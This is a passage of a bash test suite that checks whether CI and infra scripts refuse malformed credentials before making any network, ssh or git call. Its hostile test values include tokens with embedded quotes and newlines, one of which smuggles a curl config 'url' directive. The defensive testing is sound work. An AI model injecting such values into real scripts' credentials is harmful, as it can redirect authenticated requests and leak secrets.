s4_v_r18() { [[ "$S4_RC" == 0 ]] && s4_gho_has 'failure_mode=secret_unset' && ! grep -qE '^failure_mode=(inngest_down|inngest_unhealthy|probe_unavailable|functions_query_degraded)$' "$S4_ROW/gho" || return 1
  case "$2" in hostile-*|absent) [[ "$(s4_markers)" -ge 1 ]] ;; *) [[ "$(s4_markers)" == 0 ]] ;; esac; }
s4_sweep r18 "$S4/b-r18.sh" "$S4/real" s4_v_r18 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 18 inngest-health probe: an empty, unset or hostile credential records failure_mode=secret_unset (liveness-probe class, NO restart verdict, never inngest_down), exits 0, makes zero requests"
s4_nopy_row "S4 row 18 inngest-health probe (library HMAC site): python3 absent records secret_unset with the marker and zero requests (the restart path is never reached)" "$S4/b-r18.sh" s4_v_r18
S4_SHIM="$S4/shimreal"; s4_run r18-transport "$S4/b-r18.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" == 0 && "$(s4_markers)" == 0 ]] && s4_gho_has 'failure_mode=probe_unavailable'; then row "S4 row 18 inngest-health probe: a REAL transport failure keeps the old class (probe_unavailable after 3 attempts), no marker" ok
else row "S4 row 18 inngest-health probe: transport failure" fail "rc=$S4_RC gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
S4_CWD=""

# ---- row 21: infra-config-verify.sh (INLINE + pre-guard): a refused credential must NOT print the "webhook listener being DOWN" sentence ----
S4_ICV="$REPO_ROOT/apps/web-platform/infra/infra-config-verify.sh"
S4_FLAGS=(--noprofile --norc); S4_CWD="$REPO_ROOT/apps/web-platform/infra"
S4_BASE=("${S4_DOP_BASE[@]}" VERIFY_PASS=1 INFRA_CONFIG_STATUS_RESPONSE=@ROW@/rt/status.txt SHIM_STATUS_BODY='{"exit_code":0,"reason":"success","start_ts":1700000123}')
s4_run r21-ok "$S4_ICV" "$S4/real" "${S4_BASE[@]}"
if [[ "$(s4_ncalls)" -ge 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && ! s4_said 'webhook listener being DOWN'; then
  row "S4 row 21 infra-config-verify (inline): a well-formed poll sends the digest over the empty body and the pair as three stdin directives, none on argv, and makes no refusal" ok
else row "S4 row 21 infra-config-verify (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_v_r21() { ! s4_said 'webhook listener being DOWN' && ! s4_said 'UNREACHABLE (HTTP' || return 1
  if [[ "$2" == unset ]]; then [[ "$S4_RC" != 0 ]]   # the doppler read aborts the script before any guard: unchanged behaviour, no request
  else [[ "$S4_RC" == 1 && "$(s4_markers)" == 1 ]] && s4_said 'this says nothing about the listener'; fi; }
s4_sweep r21 "$S4_ICV" "$S4/real" s4_v_r21 "D_CF_ACCESS_CLIENT_ID D_CF_ACCESS_CLIENT_SECRET" "D_WEBHOOK_DEPLOY_SECRET"
s4_sweep_row "S4 row 21 infra-config-verify: an empty or hostile credential exits 1 with its OWN message ('this says nothing about the listener') and the marker once, zero requests, never the 'listener being DOWN' sentence; an unset one aborts before any guard"
s4_nopy_row "S4 row 21 infra-config-verify (inline HMAC site): python3 absent is the same own-message exit 1 with the marker and zero requests, never the DOWN sentence" "$S4_ICV" s4_v_r21
S4_SHIM="$S4/shimreal"; s4_run r21-transport "$S4_ICV" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" == 1 && "$(s4_markers)" == 0 ]] && s4_said 'did not respond with HTTP 200 after 3 attempts'; then row "S4 row 21 infra-config-verify: a REAL transport failure keeps the old verdict (3 attempts, the 000000 quirk lands in the generic non-200 arm), no marker" ok
else row "S4 row 21 infra-config-verify: transport failure" fail "rc=$S4_RC markers=$(s4_markers)"; fi
S4_FLAGS=(--noprofile --norc -e); S4_CWD=""

# ---- row 22: github-app-key-status.sh (library): a refusal reaches the EXISTING exit-6 arm (curl_rc=2) with the marker visible ----
S4_GAK="$REPO_ROOT/apps/web-platform/scripts/github-app-key-status.sh"
S4_FLAGS=(--noprofile --norc)
S4_GAK_BODY='{"github_app_key_source":"doppler","github_app_key_fetch":"ok","github_app_key_probe":"accepted","component":"web-platform","tag":"v1.2.3","exit_code":0,"reason":"success","end_ts":1700000200,"host_id":"web-1"}'
S4_BASE=(WEBHOOK_DEPLOY_SECRET="$S4_KEY" CF_ACCESS_CLIENT_ID="$S4_CFID" CF_ACCESS_CLIENT_SECRET="$S4_CFSEC" SHIM_PROFILE=webhook SHIM_STATUS_BODY="$S4_GAK_BODY")
s4_run r22-ok "$S4_GAK" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'github_app_key_source=doppler' && s4_said 'host_id=web-1'; then
  row "S4 row 22 github-app-key-status: a well-formed run prints the key-source lines (exit 0) through the digest and the pair on stdin, none on argv" ok
else row "S4 row 22 github-app-key-status: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r22() { case "$1:$2" in
    WEBHOOK_DEPLOY_SECRET:*|*:empty|*:unset) [[ "$S4_RC" == 3 && "$(s4_markers)" == 0 ]] && s4_said 'missing ' ;;   # credentials not injected: the existing exit 3
    *) [[ "$S4_RC" == 6 && "$(s4_markers)" == 1 ]] && s4_said 'deploy-status read failed: http_code= curl_rc=2' ;;
  esac; }
s4_sweep r22 "$S4_GAK" "$S4/real" s4_v_r22 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_DEPLOY_SECRET"
s4_sweep_row "S4 row 22 github-app-key-status: an empty or unset credential keeps exit 3; a hostile one reaches the existing exit-6 arm with curl_rc=2, the marker once, zero requests and the canary absent"
s4_v_r22_nopy() { [[ "$S4_RC" == 6 && "$(s4_markers)" == 1 ]] && s4_said 'curl_rc=2'; }
s4_nopy_row "S4 row 22 github-app-key-status (library HMAC site): python3 absent reaches exit 6 (curl_rc=2) with the marker and zero requests" "$S4_GAK" s4_v_r22_nopy
S4_FLAGS=(--noprofile --norc -e)

# ---- row 20: push-infra-config.sh (library, found by BASH_SOURCE). A script, not a workflow step, and no existing suite executes it: the REAL
# script runs here under the recording curl with INFRA_DIR at the real apps/web-platform/infra ----
S4_PIC="$REPO_ROOT/apps/web-platform/infra/push-infra-config.sh"
S4_FLAGS=(--noprofile --norc)
S4_PIC_BASE=(WEBHOOK_SECRET="$S4_KEY" CF_ACCESS_ID="$S4_CFID" CF_ACCESS_SECRET="$S4_CFSEC" APP_DOMAIN_BASE=example.invalid INFRA_DIR="$REPO_ROOT/apps/web-platform/infra" HOOKS_JSON_B64=e30= SOLEUR_DOPPLER_TOKEN_B64=eA== SHIM_PROFILE=webhook)
S4_BASE=("${S4_PIC_BASE[@]}")
s4_run r20-ok "$S4_PIC" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4_ROW/calls/1.body" 1 && s4_said 'infra-config push succeeded (HTTP 202)' \
   && grep -qF '"ci_deploy_sh_b64"' "$S4_ROW/calls/1.body"; then
  row "S4 row 20 push-infra-config: the REAL script signs the payload FILE bytes (independent openssl digest over the recorded body), sends the digest and the pair as three stdin headers in no argv, and a 202 prints 'infra-config push succeeded (HTTP 202)'" ok
else row "S4 row 20 push-infra-config: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_v_r20() { [[ "$S4_RC" != 0 ]] && ! s4_said 'infra-config push succeeded' || return 1
  case "$2" in hostile-*) [[ "$(s4_markers)" == 1 ]] ;; *) [[ "$(s4_markers)" == 0 ]] && s4_said "required env var $1 is missing or empty" ;; esac; }
s4_v_r20_nopy() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 1 ]] && ! s4_said 'infra-config push succeeded'; }
s4_sweep r20 "$S4_PIC" "$S4/real" s4_v_r20 "CF_ACCESS_ID CF_ACCESS_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 20 push-infra-config: an empty or unset credential or key keeps the script's own required-variable error, a hostile Cloudflare value is refused with ONE marker; every one exits non-zero with ZERO requests and the canary absent (no partial delivery to web-1)"
s4_nopy_row "S4 row 20 push-infra-config (library HMAC site): python3 absent exits non-zero with the marker and ZERO requests, never a mute abort and never a push" "$S4_PIC" s4_v_r20_nopy
S4_PUSH_BAD=""
for pc in 401 403 404 500; do
  s4_run "r20-$pc" "$S4_PIC" "$S4/real" "${S4_BASE[@]}" SHIM_POST_CODE="$pc"
  [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 1 ]] && ! s4_said 'infra-config push succeeded' && s4_said "webhook returned HTTP $pc (expected 202)" || S4_PUSH_BAD+=" $pc"
done
[[ -z "$S4_PUSH_BAD" ]] && row "S4 row 20 push-infra-config: a 401, 403, 404 or 500 from the webhook is never a pass (non-zero, no 'succeeded' line)" ok || row "S4 row 20 push-infra-config: a non-202 maps to a pass" fail "codes:$S4_PUSH_BAD"
S4_SHIM="$S4/shimreal"; s4_run r20-transport "$S4_PIC" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
[[ "$S4_RC" != 0 && "$(s4_markers)" == 0 ]] && ! s4_said 'infra-config push succeeded' && row "S4 row 20 push-infra-config: a REAL transport failure still exits non-zero and is not a refusal (no marker)" ok || row "S4 row 20 push-infra-config: transport failure" fail "rc=$S4_RC markers=$(s4_markers)"
S4_FLAGS=(--noprofile --norc -e)

# ---- row 24: bump-inngest-bootstrap-pin.sh: the token left the push URL for a per-command environment header. A refused token dies at `args` with the
# marker BEFORE any git network call. The real script runs against an empty fixture repo with a recording git and fail-closed gh / crane ----
S4_BUMP="$REPO_ROOT/.github/scripts/bump-inngest-bootstrap-pin.sh"
S4_BB="$S4/bumpbin"; assert_fixture_dir "$S4_BB"; mkdir -p "$S4_BB"
REAL_GIT="$(type -P git)"
printf '#!%s\nprintf "%%s\\n" "$*" >> "${CALLS_DIR:?}/git.log"\nexec "%s" "$@"\n' "$BASH_BIN" "$REAL_GIT" > "$S4_BB/git"
for t in gh crane; do printf '#!%s\nprintf "%%s\\n" "%s" >> "${CALLS_DIR:?}/unexpected"\nexit 97\n' "$BASH_BIN" "$t" > "$S4_BB/$t"; done
chmod +x "$S4_BB/git" "$S4_BB/gh" "$S4_BB/crane"
S4_BREPO="$S4/bump-repo"; assert_fixture_dir "$S4_BREPO"; mkdir -p "$S4_BREPO"
env -i PATH="$S4/real:$(dirname "$REAL_GIT")" HOME="$S4" "$REAL_GIT" init -q "$S4_BREPO" || fatal "S4 row 24: could not initialise the fixture repo"
S4_GHS="ghs""_$(od -An -N20 -tx1 /dev/urandom | tr -d ' \n')"
S4_ARGS=(--signed-tag v1.2.3 --signed-digest "sha256:${S4_HEX64}" --signed-commit "$(od -An -N20 -tx1 /dev/urandom | tr -d ' \n')")
S4_FLAGS=(--noprofile --norc)
S4_BUMP_BASE=(BUMP_REPO_DIR="$S4_BREPO" GITHUB_REPOSITORY=jikig-ai/soleur)
s4_bump_net() { ! grep -qE '(^| )(ls-remote|push)( |$)' "$S4_ROW/calls/git.log" 2>/dev/null; }
S4_SHIM="$S4_BB"
S4_BUMP_BAD=""
for st in empty unset hostile-quote hostile-newline; do
  e=(); case "$st" in empty) e=(GH_TOKEN=) ;; unset) e=() ;; hostile-quote) e=("GH_TOKEN=${S4_CANARY}\"x") ;; hostile-newline) e=("GH_TOKEN=${S4_CANARY}"$'\n'"x") ;; esac
  s4_run "r24-$st" "$S4_BUMP" "$S4/real" "${S4_BUMP_BASE[@]}" ${e[@]+"${e[@]}"}
  { [[ "$S4_RC" == 1 && "$(s4_markers)" == 1 ]] && grep -qx 'result=error' "$S4_ROW/stdout" && s4_said '::error::args: GH_TOKEN' && s4_bump_net && [[ ! -e "$S4_ROW/calls/unexpected" ]] && s4_canary_clean; } || S4_BUMP_BAD+=" $st(rc=$S4_RC markers=$(s4_markers))"
done
[[ -z "$S4_BUMP_BAD" ]] && row "S4 row 24 bump-inngest-bootstrap-pin: an empty, unset or hostile GH_TOKEN dies at 'args' (exit 1, result=error) with the marker ONCE, no git ls-remote or push, no gh or crane call and the canary absent" ok || row "S4 row 24 bump-inngest-bootstrap-pin: a refused token" fail "$S4_BUMP_BAD"
s4_run r24-ok "$S4_BUMP" "$S4/real" "${S4_BUMP_BASE[@]}" GH_TOKEN="$S4_GHS"
if [[ "$(s4_markers)" == 0 ]] && ! s4_said 'GH_TOKEN (soleur-infra installation token) is required' && ! grep -qF -- "$S4_GHS" "$S4_ROW/calls/git.log" 2>/dev/null && ! grep -qF -- "$S4_GHS" < <(cat "$S4_ROW/stdout" "$S4_ROW/stderr"); then
  row "S4 row 24 bump-inngest-bootstrap-pin: a well-formed ghs_ token passes the shape guard (no marker, no token message) and appears in no recorded git argument and no output" ok
else row "S4 row 24 bump-inngest-bootstrap-pin: well-formed token" fail "rc=$S4_RC markers=$(s4_markers)"; fi
S4_SHIM="$S4/shim"; S4_ARGS=(); S4_FLAGS=(--noprofile --norc -e)

# ---- rows 19, 6, 3, 5, 16, 17: the census rows that had NO executed row (review F2). Until now a refusal at these sites was judged only by static
# pins (the parity audit, the `_bearer_ok` byte pin, replay), which cannot see a VERDICT-CLASS change: `|| HTTP_CODE=000` on the deploy-inngest-image
# trigger, the mint exchange swallowed with `|| true`, or the Hetzner guard neutered to `if false` all left the battery green. The REAL step bodies run
# here under the recording shims, each credential empty, unset and hostile, and every mutant above is a CONTROL row that the same verdict function must
# judge RED. Not executed, with the reason: the redeploy POST of row 16 alone (it shares every credential with the baseline read in front of it, so a
# refusal cannot reach the POST on its own: the baseline read's refusal row covers the class, and the well-formed run proves the POST's digest and pair).
S4_HZ="$(head -c 96 /dev/urandom | base64 -w0 | tr -d '+/=' | head -c 64)"
S4_BOOT="synth-boot-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
S4_SSHREC="$S4/sshrec"
cat > "$S4_SSHREC" <<'S4SSH'
#!/usr/bin/env bash
# The recording ssh behind ${WEB_HOST_SSH}: logs every invocation's arguments, answers the bundle-dir probe, swallows stdin.
printf '%s\n' "$*" >> "${CALLS_DIR:?}/ssh.log"
case "$*" in *"mktemp -d"*) printf '/var/lib/workspaces-luks/wl-cutover.AbCd12\n' ;; *) cat > /dev/null ;; esac
exit "${SSH_RC:-0}"
S4SSH
sed -i "1s|.*|#!${BASH_BIN}|" "$S4_SSHREC"; chmod +x "$S4_SSHREC"
s4_ssh_calls() { if [[ -s "$S4_ROW/calls/ssh.log" ]]; then grep -c . "$S4_ROW/calls/ssh.log"; else echo 0; fi; }
# s4_creds_clean <var>...: none of the named values appears on any recorded argv (curl, python3, openssl) nor in the ssh log.
s4_creds_clean() { local v; for v in "$@"; do s4_nowhere_on_argv "$v" && ! grep -qaF -- "$v" "$S4_ROW/calls/ssh.log" 2>/dev/null || return 1; done; }

# ---- row 19: workspaces-luks-cutover "Run workspaces-luks cutover": the Hetzner volume lookup (INLINE wrapper; the step may execute no repo script).
# DATA-DESTRUCTIVE PRECONDITION: the lookup decides which device the real arm luksFormats. A refused token must abort BEFORE any ssh call and any device write:
# zero requests, zero ssh invocations, no REMOTE_DIR, exit 1 (the step runs `set +e`, so the abort is the explicit `exit 1`).
S4_LUKS=".github/workflows/workspaces-luks-cutover.yml"
s4_body "$REPO_ROOT/$S4_LUKS" "Run workspaces-luks cutover" "$S4/b-r19.sh"
S4_LUKS_BASE=(DOPPLER_TOKEN=synth-doppler-token WORKSPACES_LUKS_BOOT_TOKEN="$S4_BOOT" DRY_RUN=1 ROLLBACK=0 ROLLBACK_ACK_LUKS_WRITES=0 CLEAN_STRAY=0 WEB_HOST=10.0.1.10
  WEB_HOST_SSH="$S4_SSHREC" INFRA_DIR=apps/web-platform/infra SHIM_PROFILE=generic 'SHIM_BODY={"volumes":[{"id":4242}]}')
s4_luks_ok_run() { # <label> <body> <NAME=value>...: a well-formed run of the (possibly mutated) step
  local l="$1" b="$2"; shift 2; s4_run "$l" "$b" "$S4/real" "${S4_LUKS_BASE[@]}" "$@"; }
s4_luks_ok_run r19-ok "$S4/b-r19.sh" D_HCLOUD_TOKEN_READONLY="$S4_HZ"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 && "$(s4_ssh_calls)" == 3 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_HZ\"" ]] && s4_calls_ok 1 \
   && s4_creds_clean "$S4_HZ" "$S4_BOOT" && s4_genv_has 'REMOTE_DIR=/var/lib/workspaces-luks/wl-cutover.AbCd12' && grep -qF 'volumes?name=soleur-web-platform-data-luks' "$S4_ROW/calls/1.argv"; then
  row "S4 row 19 luks Hetzner read (inline): a well-formed run reads the volume with the read-only token as the ONLY stdin header, the token and the boot token are on no curl, python3, openssl or ssh argument, and the delivery follows (3 ssh calls)" ok
else row "S4 row 19 luks Hetzner read (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) ssh=$(s4_ssh_calls) markers=$(s4_markers)"; fi
# The fallback arm until ADR-241 O10: an unset or empty read-only name reads the read/write name, judged by the same guard.
s4_luks_ok_run r19-fallback "$S4/b-r19.sh" D_HCLOUD_TOKEN="$S4_HZ"
[[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_HZ\"" && "$(s4_ssh_calls)" == 3 ]] && s4_calls_ok 1 && s4_creds_clean "$S4_HZ" \
  && row "S4 row 19 luks Hetzner read (inline): with the read-only name unset the read/write fallback is used and judged by the same guard" ok || row "S4 row 19 luks Hetzner read (inline): fallback arm" fail "rc=$S4_RC calls=$(s4_ncalls)"
s4_v_r19() { # a refusal: exit 1 with the step's own sentence and ONE marker, zero requests, ZERO ssh calls, no bundle dir, nothing delivered
  [[ "$S4_RC" == 1 && "$(s4_markers)" == 1 && "$(s4_ncalls)" == 0 && "$(s4_ssh_calls)" == 0 ]] && s4_said 'workspaces-luks-cutover: HCLOUD_TOKEN unusable' \
    && s4_said 'no request was made and nothing was delivered to web-1' && ! s4_said 'refusing to guess' && ! grep -q '^REMOTE_DIR=' "$S4_ROW/genv" && [[ ! -e "$S4_ROW/calls/ssh.log" ]]
}
S4_BASE=("${S4_LUKS_BASE[@]}")
s4_sweep r19 "$S4/b-r19.sh" "$S4/real" s4_v_r19 "D_HCLOUD_TOKEN_READONLY" ""
s4_sweep_row "S4 row 19 luks Hetzner read (inline, data-destructive precondition): an empty, unset or hostile read-only token (the fallback unavailable) aborts the step with exit 1, ONE marker, ZERO requests and ZERO ssh invocations, before the device is resolved or anything is delivered"
S4_BASE=("${S4_LUKS_BASE[@]}" D_HCLOUD_TOKEN="$S4_HZ")
s4_sweep r19fb "$S4/b-r19.sh" "$S4/real" s4_v_r19 "D_HCLOUD_TOKEN" ""
s4_sweep_row "S4 row 19 luks Hetzner read (inline): an empty, unset or hostile read/write FALLBACK token (the read-only name unset) is refused the same way, with zero requests and zero ssh invocations"
# CROSS (ADR-241 O10): the fallback to the read/write token happens ONLY when the read-only token is EMPTY or unreadable, never because it is MALFORMED. A refused read-only token
# beside a VALID read/write token must still ABORT (no request, no ssh), or a refused read-only credential would be silently upgraded to the write-capable one on a data-destructive
# path (the two sweeps above each leave the other name unset, so an `_bearer_ok "$RO" || HCLOUD_TOKEN=$RW` implementation is green in both).
S4_X19_BAD=""
for xv in "hostile-quote:${S4_CANARY}\"x" $'hostile-newline:'"${S4_CANARY}"$'\n'"url = \"http://127.0.0.1:9/\"" "space:${S4_HZ:0:6} ${S4_HZ:6}"; do
  s4_run "r19x-${xv%%:*}" "$S4/b-r19.sh" "$S4/real" "${S4_LUKS_BASE[@]}" "D_HCLOUD_TOKEN_READONLY=${xv#*:}" "D_HCLOUD_TOKEN=$S4_HZ"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
  { s4_v_r19 && s4_canary_clean && s4_creds_clean "$S4_HZ"; } || S4_X19_BAD+=" [${xv%%:*} rc=$S4_RC calls=$(s4_ncalls) ssh=$(s4_ssh_calls) markers=$(s4_markers)]"
done
[[ -z "$S4_X19_BAD" ]] && row "S4 row 19 luks Hetzner read (inline, data-destructive precondition): a MALFORMED read-only token beside a VALID read/write token aborts the step (exit 1, ONE marker, ZERO requests, ZERO ssh); the read/write token is never used because the read-only one was refused (3 shapes)" ok || row "S4 row 19 luks Hetzner read (inline): a malformed read-only token fell back to the read/write token" fail "$S4_X19_BAD"
S4_XF_BUILT=0; s4_body_try "$REPO_ROOT/$S4_LUKS" "Run workspaces-luks cutover" "$S4/b-r19-xfall.sh" 'if ! _bearer_ok "$HCLOUD_TOKEN"; then' \
  'if ! _bearer_ok "$HCLOUD_TOKEN" && { HCLOUD_TOKEN="$(doppler secrets get HCLOUD_TOKEN --plain -p soleur -c prd_terraform)"; ! _bearer_ok "$HCLOUD_TOKEN"; }; then' && S4_XF_BUILT=1
if [[ "$S4_XF_BUILT" == 1 ]]; then s4_luks_ok_run ctl-r19-xfall "$S4/b-r19-xfall.sh" "D_HCLOUD_TOKEN_READONLY=${S4_CANARY}\"x" "D_HCLOUD_TOKEN=$S4_HZ"; fi
if [[ "$S4_XF_BUILT" == 1 && "$(s4_ncalls)" == 1 ]] && ! s4_v_r19; then row "S4 row 19 luks Hetzner read control: a step that falls back to the read/write token when the read-only one is MALFORMED makes the request with the write-capable token and is judged RED by the cross row's verdict" ok
else row "S4 row 19 luks Hetzner read control: the malformed-falls-back mutant is not judged red" fail "built=$S4_XF_BUILT calls=$(s4_ncalls) (untested: the step no longer contains the line the control mutates)"; fi
# CONTROLS (mutants): the verdict must judge each RED. `if false` is the neutered guard (measured surviving in BOTH the sweep and the luks suite before this row).
S4_NG_CALLS=0; S4_NG_V=untested; S4_NG_ARGV=untested
if s4_body_try "$REPO_ROOT/$S4_LUKS" "Run workspaces-luks cutover" "$S4/b-r19-noguard.sh" 'if ! _bearer_ok "$HCLOUD_TOKEN"; then' 'if false; then' \
   && s4_body_try "$REPO_ROOT/$S4_LUKS" "Run workspaces-luks cutover" "$S4/b-r19-argv.sh" '--max-time 15 --config - \' '--max-time 15 -H "Authorization: Bearer $HCLOUD_TOKEN" \'; then
  s4_luks_ok_run ctl-r19-noguard "$S4/b-r19-noguard.sh" "D_HCLOUD_TOKEN_READONLY=${S4_CANARY}"$'\n'"url = \"http://127.0.0.1:9/\""
  S4_NG_CALLS="$(s4_ncalls)"; if s4_v_r19; then S4_NG_V=green; else S4_NG_V=red; fi
  s4_luks_ok_run ctl-r19-argv "$S4/b-r19-argv.sh" D_HCLOUD_TOKEN_READONLY="$S4_HZ"
  if s4_argv_has "$S4_HZ" && ! s4_calls_ok 1 && ! s4_nowhere_on_argv "$S4_HZ"; then S4_NG_ARGV=red; else S4_NG_ARGV=green; fi
fi
if [[ "$S4_NG_CALLS" -ge 1 && "$S4_NG_V" == red && "$S4_NG_ARGV" == red ]]; then
  row "S4 row 19 luks Hetzner read control: a step whose guard is neutered ('if false') sends a hostile token (a request is made, so the refusal verdict is RED), and one that puts the token back on curl's argument list (-H) is judged RED by the stdin and argv predicates" ok
else row "S4 row 19 luks Hetzner read control: a mutant of the Hetzner guard or channel is not judged red" fail "noguard-calls=$S4_NG_CALLS verdict=$S4_NG_V argv-verdict=$S4_NG_ARGV (untested: the step no longer contains the line a control mutates)"; fi

# ---- row 6: mint-infra-app-token composite: the JWT exchange and the revoke. The JWT is minted inside the step from a synthetic RSA key (generated here), so no
# input makes the real guard refuse it: the refusal is SIMULATED by a copy of the library whose bc_curl refuses (the shape the real chokepoint returns) and the
# row asserts what the step does with it: a RED step naming the exchange, never an empty-response "returned no token" class and never a swallowed failure.
S4_MINT=".github/actions/mint-infra-app-token/action.yml"
S4_PEM="$("$REAL_OSSL" genrsa 2048 2>/dev/null)"; [[ "$S4_PEM" == *"PRIVATE KEY"* ]] || fatal "S4 row 6: could not generate a synthetic RSA key"
s4_body "$REPO_ROOT/$S4_MINT" "Mint installation token" "$S4/b-r6.sh"
S4_MINT_WS="$S4/ws-mintrefuse"; assert_fixture_dir "$S4_MINT_WS"; mkdir -p "$S4_MINT_WS/scripts/lib"
{ cat "$REPO_ROOT/scripts/lib/bearer-curl.sh"; printf '%s\n' 'bc_curl() { echo "bc_curl: JWT unusable" >&2; echo "SOLEUR_CREDENTIAL_REFUSED script=$1 reason=token_shape" >&2; return 2; }'; } > "$S4_MINT_WS/scripts/lib/bearer-curl.sh"
S4_MINT_RESP="{\"token\":\"${S4_GHS}\",\"permissions\":{\"actions\":\"write\",\"metadata\":\"read\"},\"repository_selection\":\"selected\",\"repositories\":[{\"name\":\"soleur\"}]}"
S4_MINT_BASE=(DOPPLER_TOKEN=synth-doppler-token DOPPLER_SOURCE=soleur-infra-app INSTALLATION_ID=166065653 'SCOPE_PERMISSIONS={"actions":"write"}' SCOPE_REPOSITORIES=soleur
  D_GITHUB_INFRA_APP_ID=123456 "D_GITHUB_INFRA_APP_PRIVATE_KEY=$S4_PEM" SHIM_PROFILE=generic SHIM_CODE=201)
s4_run r6-ok "$S4/b-r6.sh" "$S4/real" "${S4_MINT_BASE[@]}" "SHIM_BODY=$S4_MINT_RESP"
S4_JWT_LINE="$(s4_stdin_line 1 1)"; S4_JWT_V="${S4_JWT_LINE#header = \"Authorization: Bearer }"; S4_JWT_V="${S4_JWT_V%\"}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 1 && [[ "$S4_JWT_V" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$ ]] && s4_nowhere_on_argv "$S4_JWT_V" \
   && s4_gho_has "token=$S4_GHS" && [[ "$(jq -c . "$S4_ROW/calls/1.body")" == '{"repositories":["soleur"],"permissions":{"actions":"write"}}' ]]; then
  row "S4 row 6 mint exchange: a well-formed run sends the App JWT as the ONLY stdin header (none on a curl, python3 or openssl argument), the scoped body as the request body, and emits the installation token" ok
else row "S4 row 6 mint exchange: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_v_r6() { [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] && s4_said 'the installation-token exchange did not complete (curl rc=2' && ! s4_said 'returned no token' && ! grep -q '^token=' "$S4_ROW/gho"; }
s4_run r6-refused "$S4/b-r6.sh" "$S4/real" "${S4_MINT_BASE[@]}" "SHIM_BODY=$S4_MINT_RESP" GITHUB_WORKSPACE="$S4_MINT_WS"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
if s4_v_r6 && s4_canary_clean; then row "S4 row 6 mint exchange: a refused JWT (simulated at the library chokepoint: rc 2 and the marker) is a RED step that names the exchange (curl rc=2), with zero requests, no token output and the error text VISIBLE (neither swallowed nor read as 'returned no token')" ok
else row "S4 row 6 mint exchange: refused JWT" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
S4_SW_BUILT=0; s4_body_try "$REPO_ROOT/$S4_MINT" "Mint installation token" "$S4/b-r6-swallow.sh" '|| curl_rc=$?' '|| true' && S4_SW_BUILT=1
if [[ "$S4_SW_BUILT" == 1 ]]; then s4_run ctl-r6-swallow "$S4/b-r6-swallow.sh" "$S4/real" "${S4_MINT_BASE[@]}" "SHIM_BODY=$S4_MINT_RESP" GITHUB_WORKSPACE="$S4_MINT_WS"; fi
if [[ "$S4_SW_BUILT" == 1 ]] && ! s4_v_r6 && [[ "$S4_RC" != 0 ]] && s4_said 'returned no token'; then row "S4 row 6 mint exchange control: swallowing the exchange (|| true) is judged RED (the refusal degrades to the 'returned no token' class)" ok
else row "S4 row 6 mint exchange control: a swallowed exchange is not judged red" fail "built=$S4_SW_BUILT rc=$S4_RC"; fi
# The revoke inside the step: a token whose grant differs from the request was ISSUED, so it is revoked with the same stdin channel (best effort) before the step fails.
S4_MINT_WRONG="{\"token\":\"${S4_GHS}\",\"permissions\":{\"contents\":\"write\",\"metadata\":\"read\"},\"repository_selection\":\"selected\",\"repositories\":[{\"name\":\"soleur\"}]}"
s4_run r6-revoke "$S4/b-r6.sh" "$S4/real" "${S4_MINT_BASE[@]}" "SHIM_BODY=$S4_MINT_WRONG"
if [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 2 && "$(s4_stdin_line 2 1)" == "header = \"Authorization: Bearer $S4_GHS\"" && "$(s4_markers)" == 0 ]] && s4_calls_ok 1 && s4_argv_has DELETE && s4_nowhere_on_argv "$S4_GHS" \
   && s4_said 'differ from the requested' && ! grep -q '^token=' "$S4_ROW/gho"; then
  row "S4 row 6 mint revoke: a grant that differs from the request fails the step AFTER revoking the issued token, which rides the stdin channel only (none on any argv), and no token is emitted" ok
else row "S4 row 6 mint revoke: revoke path" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi

# ---- row 5: apply-github-infra "Revoke the soleur-infra token" (best effort: a refusal is a WARNING and the step ends 0) ----
S4_AGI=".github/workflows/apply-github-infra.yml"
s4_body "$REPO_ROOT/$S4_AGI" "Revoke the soleur-infra token" "$S4/b-r5.sh"
S4_BASE=(REVOKE_TOKEN="$S4_GHS" SHIM_PROFILE=generic SHIM_CODE=204)
s4_run r5-ok "$S4/b-r5.sh" "$S4/real" "${S4_BASE[@]}"
